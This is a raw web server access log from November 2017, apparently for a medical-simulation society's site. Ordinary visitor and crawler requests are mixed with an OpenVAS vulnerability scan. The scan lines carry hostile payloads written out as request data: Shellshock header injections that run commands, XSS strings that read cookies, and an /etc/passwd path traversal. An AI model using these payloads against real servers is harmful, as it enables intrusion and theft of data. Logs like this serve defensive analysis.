217.64.42.218 - - [08/Nov/2017:04:33:52 +0000] "GET /vGQEdcpMXwKR.html HTTP/1.1" 403 5871 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
207.46.13.66 - - [07/Nov/2017:05:02:19 +0000] "GET /news/sesam-event-newsletter-may-2017/ HTTP/1.1" 200 44832 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.66 - - [05/Nov/2017:13:47:31 +0000] "GET /centres/centre/edusim/ HTTP/1.1" 200 23071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:40:11 +0000] "GET /scripts/index.php?option=com_search&searchword=xss&ordering=%22%20onmouseover=alert(document.cookie)%20style=position:fixed;top:0;left:0;width:100%;height:100%;%22 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:33:56 +0000] "GET /cgi-bin/vGQEdcpMXwKR.cfm HTTP/1.1" 404 580 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:37:59 +0000] "GET /account/login HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:04 +0000] "GET /SwiftMailer HTTP/1.1" 403 5807 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:49:37 +0000] "GET /cgi-bin/helpme HTTP/1.1" 404 6022 "() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }" "-"
185.69.144.0 - - [06/Nov/2017:07:30:03 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 12361 "-" "MobileSafari/604.1 CFNetwork/887 Darwin/17.0.0"
185.94.60.201 - - [07/Nov/2017:12:15:22 +0000] "GET /centres/centre.json?slug=simulatiecentrum-maastricht-umc-academie HTTP/1.1" 200 1213 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
54.254.133.112 - - [07/Nov/2017:06:09:13 +0000] "GET /favicon.ico HTTP/1.1" 200 1507 "https://www.sesam-web.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:38:19 +0000] "GET / HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
197.245.101.120 - - [08/Nov/2017:19:36:55 +0000] "POST /members/register/ HTTP/1.1" 302 6093 "https://www.sesam-web.org/members/register/?next=/abstracts/submitabstract/sesam-barcelona-2018/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:47:02 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 404 6024 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:40:34 +0000] "GET /scripts/campaigns/some.php?campaign_title=test<script>alert('attack');</script> HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:00 +0000] "GET /scripts/index.php?lng=../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:46:40 +0000] "GET /cgi-bin/php.cgi HTTP/1.1" 404 6023 "-" "-"
37.216.205.33 - - [07/Nov/2017:12:45:03 +0000] "GET /events/pages/sesam-barcelona-2018/registration-and-abstracts2018/ HTTP/1.1" 200 17423 "https://www.sesam-web.org/events/event/sesam-barcelona-2018/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
217.64.42.218 - - [08/Nov/2017:04:43:47 +0000] "POST /cgi-bin/server.php HTTP/1.1" 404 6026 "() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }" "-"
212.133.241.172 - - [06/Nov/2017:13:02:07 +0000] "-" 408 5569 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:35:10 +0000] "GET /scripts/lib HTTP/1.1" 403 5807 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:37 +0000] "GET /login.rol HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:46:32 +0000] "POST /cgi-bin/printenv HTTP/1.1" 404 6024 "() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;" "-"
217.64.42.218 - - [08/Nov/2017:04:34:47 +0000] "GET /home/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
66.249.70.8 - - [06/Nov/2017:09:26:11 +0000] "GET /.well-known/apple-app-site-association HTTP/1.1" 403 5887 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.126 - - [07/Nov/2017:00:22:22 +0000] "GET / HTTP/1.1" 403 6313 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:34:45 +0000] "GET /Nakid/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:20 +0000] "OPTIONS /scripts/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:15 +0000] "GET /typo3/ChangeLog HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:45:29 +0000] "POST /cgi-bin/env.cgi HTTP/1.1" 404 6023 "-" "-"
77.136.42.243 - - [06/Nov/2017:12:23:56 +0000] "GET / HTTP/1.1" 200 30810 "https://www.google.fr/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_3 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A432 Safari/604.1"
217.9.204.106 - - [06/Nov/2017:12:37:43 +0000] "POST /autodiscover/autodiscover.xml HTTP/1.1" 403 5676 "-" "MacOutlook/15.39.0.171010 (Intelx64 Mac OS X Version 10.13.1 (Build 17B48))"
217.64.42.218 - - [08/Nov/2017:04:34:11 +0000] "GET /apps/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.83 - - [06/Nov/2017:19:33:27 +0000] "GET /news/minutes-general-assembly-meeting-june-2014/ HTTP/1.1" 200 37907 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
95.170.156.105 - - [08/Nov/2017:04:43:47 +0000] "GET /centres/centre.json?slug=adam-amsterdam-simulation-centre HTTP/1.1" 200 1062 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
217.64.42.218 - - [08/Nov/2017:04:46:17 +0000] "GET /cgi-sys/php5 HTTP/1.1" 403 5814 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:35:25 +0000] "GET /phpNagios/index.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:54 +0000] "GET /scripts/about/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
